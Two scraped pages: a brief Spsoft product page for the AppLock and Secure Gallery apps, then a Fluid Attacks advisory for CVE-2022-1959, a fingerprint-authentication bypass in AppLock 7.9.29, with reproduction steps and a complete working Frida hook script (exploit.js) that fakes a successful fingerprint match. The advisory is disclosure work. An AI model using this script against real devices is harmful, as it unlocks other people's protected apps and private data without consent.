=== Content from www.spsoftmobile.com_e3fbb898_20250114_181403.html ===

[Spsoft](#page-top)
Menu

* [AppLock](#applock)
* [Secure Gallery](#gallery)
* [About](#about)

# Spsoft

Mobile App Development Company

## AppLock

Protect your apps with password and fingerprint!

[Free Download!](https://play.google.com/store/apps/details?id=com.sp.protector.free)

![](web/img/app/applock_01.jpg)

![](web/img/app/applock_02.jpg)

![](web/img/app/applock_03.jpg)

## Secure Gallery

Lock your photo and video with password and fingerprint!

[Free Download!](https://play.google.com/store/apps/details?id=com.sp.smartgallery.free)

![](web/img/app/gallery_01.jpg)

![](web/img/app/gallery_02.jpg)

![](web/img/app/gallery_03.jpg)

## About

[AppLock - Privacy Policy](http://spsoftmobile.com/about/privacy_applock.html)

[Secure Gallery - Privacy Policy](http://spsoftmobile.com/about/privacy_gallery.html)

Copyright © Spsoft.



=== Content from fluidattacks.com_38c6d372_20250114_181401.html ===
[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# AppLock 7.9.29 - Improper Access Control - Fingerprint

## Summary

|  |  |
| --- | --- |
| **Name** | AppLock 7.9.29 - Improper Access Control - Fingerprint |
| **Code name** | [Walker](https://en.wikipedia.org/wiki/Alan_Walker) |
| **Product** | AppLock (Fingerprint) |
| **Affected versions** | Version 7.9.29 |
|
| **State** | Public |
| **Release date** | 2022-09-26 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Improper Access Control - Fingerprint |
| **Rule** | [115. Security controls bypass or absence](https://docs.fluidattacks.com/criteria/vulnerabilities/115) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:P/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N |
| **CVSSv3.1 Base Score** | 5.5 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2022-1959](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1959) |

## Description

AppLock version 7.9.29 allows an attacker with physical access to
the device to bypass biometric authentication. This is possible
because the application did not correctly implement fingerprint
validations.

## Vulnerability

In android application fingerprint implementations, the
onAuthenticationSucceeded method is triggered when the system
successfully authenticates a user. Most biometric authentication
implementations rely on this method being called, without worrying
about the CryptoObject. The application logic responsible for
unlocking the application is usually included in this callback method.
This approach is trivially exploited by connecting to the application
process and calling the AuthenticationSucceeded method directly, as a
result, the application can be unlocked without providing valid
biometric data.

Another common case occurs when some developers use CryptoObject but do not
encrypt/decrypt data that is crucial for the application to function properly.
Therefore, we could skip the authentication step altogether and proceed to use
the application. To solve this there is no single answer, however a good approach
is to use a fingerprint protected key store key that will be used to decrypt a
symmetric key. This symmetric key must be used to decrypt the application storage.

I attach the following link so that you can better understand the vulnerability
present in AppLock:

* <https://labs.f-secure.com/blog/how-secure-is-your-android-keystore-authentication/>

## Steps to reproduce

1. Install and configure AppLock.
2. Activate and configure fingerprint protection in AppLock.
3. Install and configure frida as indicated in the following [link](https://programmerclick.com/article/51481638343/).
4. Start AppLock on your device, if you set everything up correctly, you should now
   see a prompt to put your fingerprint.
5. Run the following command on your laptop.

   ```
   frida -U 'AppLock' -l exploit.js --no-pause

   ```
6. Now on your device press the 'recent' button, commonly represented by a square.
   This button opens the recent apps view so that you can switch from one open app
   to another.
7. Log back into AppLock.
8. Now all you have to do is log in again. This time you will enter the application
   instantly, without having entered a valid fingerprint.

## Exploitation

### exploit.js

```
// exploit.js
const getAuthResult = (AuthenticationResult, crypto) => AuthenticationResult.$new(
 crypto, null, 0
);

const exploit = () => {
 console.log("[+] Hooking PassphrasePromptActivity - Method resumeScreenLock");
 const AuthenticationResult = Java.use(
 'android.hardware.fingerprint.FingerprintManager$AuthenticationResult'
 );
 const FingerprintManager = Java.use(
 'android.hardware.fingerprint.FingerprintManager'
 );
 const CryptoObject = Java.use(
 'android.hardware.fingerprint.FingerprintManager$CryptoObject'
 );

 console.log("Hooking FingerprintManagerCompat.authenticate()...");
 const fingerprintManager_authenticate = FingerprintManager['authenticate'].overload(
 'android.hardware.fingerprint.FingerprintManager$CryptoObject',
 'android.os.CancellationSignal',
 'int',
 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
 'android.os.Handler'
 );

 fingerprintManager_authenticate.implementation = (
 crypto, cancel, flags, callback, handler) => {
 console.log("Bypass Lock Screen - Fingerprint");

 // We send a null cryptoObject to the listener of the fingerprint
 var crypto = CryptoObject.$new(null);
 var authenticationResult = getAuthResult(AuthenticationResult, crypto);
 callback.onAuthenticationSucceeded(authenticationResult);
 return this.authenticate(crypto, cancel, flags, callback, handler);
 }
}

Java.perform(() => exploit());

```
## Evidence of exploitation

![applock-fingerprint-bypass](https://user-images.githubusercontent.com/51862990/192392091-e6ff1169-93d4-4c5b-ba61-59fdbf7841a8.gif)

## Our security policy

We have reserved the CVE-2022-1959 to refer to this issue from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: AppLock (Fingerprint) 7.9.29
* Operating System: Android 8.0 (API 26)

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.spsoftmobile.com>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2022-09-06

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2022-09-07

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2022-09-26

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)


